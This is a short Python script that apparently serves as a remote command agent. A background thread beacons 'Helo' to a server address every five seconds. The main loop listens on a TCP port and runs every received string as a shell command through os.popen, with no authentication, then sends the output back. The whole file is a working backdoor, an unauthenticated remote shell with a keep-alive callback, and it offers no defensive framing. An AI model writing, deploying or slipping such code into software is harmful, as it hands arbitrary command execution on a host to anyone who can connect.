#!/usr/bin/python3

import os
import time
import socket
import threading

CLIENT_IP	= '127.0.0.1' 
CLIENT_PORT 	= 10011

SERVER_KA_IP 	= '127.0.0.1'
SERVER_KA_PORT	= 10010

def keepAliveToServerThreaded(SIP, SPORT):
	while True:
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as karoot:

			try:
				karoot.connect((SIP,SPORT))
				karoot.send(b"Helo")
			except socket.error as error:
				print(f"{error}")

			karoot.close()

		time.sleep(5)

def waitForConnections():
	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as cnroot:
		
		try:
			cnroot.bind((CLIENT_IP, CLIENT_PORT))
			cnroot.listen(10)

		except socket.error as error:
			print(error)

		while True:

			clientSock, ConnData = cnroot.accept()
			message = clientSock.recv(4096).decode("utf-8")
			
			if ( message != "Finalize" ):
				output = os.popen(f"{message}").read()
				clientSock.send(output.encode("utf-8"))
				clientSock.close()
			else:
				clientSock.close()
				
if __name__ == "__main__":
	threading.Thread(target=keepAliveToServerThreaded, args=(SERVER_KA_IP, SERVER_KA_PORT)).start()
	waitForConnections()
